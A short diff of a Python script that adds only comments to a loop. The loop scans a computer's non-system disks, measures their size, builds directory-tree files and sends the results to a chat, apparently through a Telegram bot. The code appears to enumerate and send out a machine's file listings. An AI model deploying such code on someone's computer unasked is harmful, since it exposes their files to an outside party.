@@ -149,9 +149,13 @@ def get_folder_size(folder_path):
 #Param 2 : for no OS disks
 disks = scan_disks(1)
 
-#For disk in list : send disk infos --> tree function --> send file created
+#For disk in list
 for disks in disks:
+    #Calcul disk size
     total_size = get_folder_size(disks)
+    #Send infos
     send_message(chat_id, token, disks + " : " + str(total_size))
+    #Tree
     disk, temp_file_path = process_path(chat_id, token, disks)
+    #Send file
     send_file(chat_id, token, temp_file_path)
